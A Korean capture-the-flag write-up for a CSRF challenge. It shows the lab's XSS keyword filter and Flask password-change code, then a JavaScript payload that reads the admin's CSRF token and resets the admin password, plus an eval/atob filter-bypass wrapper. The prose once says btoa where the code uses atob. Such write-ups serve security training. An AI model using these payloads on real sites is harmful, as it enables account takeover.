# csrf2 - change admin password2
- 난이도 : 중
- site : 금융보안원
## 풀이
```py

def xsscheck(content):
    content = content.lower()
    vulns = ["javascript", "frame", "object", "on", "data", "base","\\u", "embed", "&#", "alert","fetch","XMLHttpRequest","eval","constructor"]
    vulns += list("'\"")
    for char in vulns:
        if char in content:
            return True

    return False
```
백엔드 로직 확인
```py
@app.route("/changepw", methods=["GET"])
def changepw():
    if "userid" not in flask.request.args or "userpw" not in flask.request.args:
        flask.session["csrf_token"] = binascii.hexlify(os.urandom(16)).decode()
        return flask.render_template("changepw.html", msg="false", csrf_token=flask.session["csrf_token"])
    else:
        if "csrf_token" not in flask.request.args:
            return flask.render_template("changepw.html", msg="please input csrf token")

        
        if flask.request.args["csrf_token"] != flask.session["csrf_token"]:
            return flask.render_template("changepw.html", msg="csrf token not match!")

        userid = flask.request.args["userid"]        
        userpw = flask.request.args["userpw"]
                
        if userid == "admin":
            if flask.request.remote_addr != socket.gethostbyname("arang_client"):
                return flask.render_template("changepw.html", msg="admin password is only changed at internal network")
        
        if userid in ids:
            ids[userid] = userpw
            return flask.redirect(flask.url_for("login"))
        else:
            return flask.render_template("changepw.html", msg="user doesn't exist")

```
첫 접속 시 /changepw에 해당 계정에 대한 csrf_token을 hidden으로 생성, 그 후 비밀번호 변경 시 파라미터에 해당 csrf_token을 넣어 줘야함.

그럼 관리자가 특정 사이트를 접속 했을 때 관리자의 csfr_token을 읽고 그대로 파리미터에 넣으면 관리자 비밀번호를 임의의 비밀번호로 바꿀 수 있음. 

```js
fetch(`/changepw`)
  .then(response => response.text())
  .then(html => {
    // HTML에서 CSRF 토큰 파싱
    const parser = new DOMParser();
    const doc = parser.parseFromString(html, `text/html`);
    const csrfToken = doc.querySelector(`input[name="csrf_token"]`).value;

    // CSRF 토큰을 포함한 새로운 GET 요청
    const userid = `admin`;
    const userpw = `11`;
    const url = `/changepw?userid=${userid}&userpw=${userpw}&csrf_token=${csrfToken}`;
      console.log(url)
    return fetch(url);
  })
```
이러한 payload를 짜서 XSS에 담으면 관리자가 읽고 자기 csrf 토큰을 인자에 넣어 비밀번호를 11로 바꿀 것이다.

그럼 이 payload를 어떻게 우회해서 심을 것인가
```html
<script>
    self[`ev`+`al`](atob(`base64로인코딩된payload`));
</script>
```
이렇게 하게 되면 base64로 인코딩된 payload가 btoa에 의해 다시 정상 자바스크립트로 풀리게 되고 그걸 eval이 실행해 해당 payload가 실행되게 된다.
